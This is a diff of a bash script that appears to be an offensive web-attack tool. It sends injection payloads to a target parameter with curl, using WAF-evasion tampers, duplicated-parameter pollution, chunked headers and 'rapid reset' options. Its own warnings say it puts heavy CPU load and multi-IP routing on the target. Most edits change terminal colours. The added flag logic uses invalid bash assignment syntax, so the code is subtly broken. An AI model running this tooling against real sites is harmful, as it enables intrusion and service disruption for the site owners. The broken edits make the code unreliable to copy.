@@ -187,15 +187,20 @@ local current_time=$(date +%H:%M:%S)
           local waf_trick=$(braindamage)
         local clean_target_url="${target_url%%\?*}"
 local active_payload=""
-          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+local boo = "true"
+         if [ "$boo" = "true" ]; then
+         if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
             active_payload="$t4"
-            echo "[i] This web is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded (Space2comment, randomcase only)."
+            echo "[i] This web is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded (Space2comment, randomcase only).\n"
+boo = "false"
           else
      active_payload="$defiance_tamper_path"
+boo = "false"
           fi
+fi
           if [ "$REQ_METHOD" = "POST" ]; then
           
-          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[90m[Payload: ${active_payload}]\033[0m\n"
+          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
 
           curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
             curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
@@ -205,7 +210,7 @@ local active_payload=""
             "${target_url}${default_path}")
         else
 
-          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0;34m] Vector 1 [GET][Port:$random_port] Probing: \033[90m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
+          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
           
           curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -302,7 +307,7 @@ fi
 
           if [ "$REQ_METHOD" = "POST" ]; then
             
-            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[90m[Payload: ${active_payload}]\033[0m\n"
+            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM  \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
 
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
               curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
@@ -312,7 +317,7 @@ fi
               "${target_url}${default_path}")
           else
 
-            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0;34m] Vector 2 [GET][Port:$random_port] Probing: \033[90m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
+            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 2 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
 
             curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -352,7 +357,7 @@ fi
           exit 1
         fi
 
-        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly in Defiance Mode."
+        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly."
         echo -e "This action will trigger heavy CPU calculation loads and dynamic Multi IP routing on the target."
         echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
         read -r legal_2
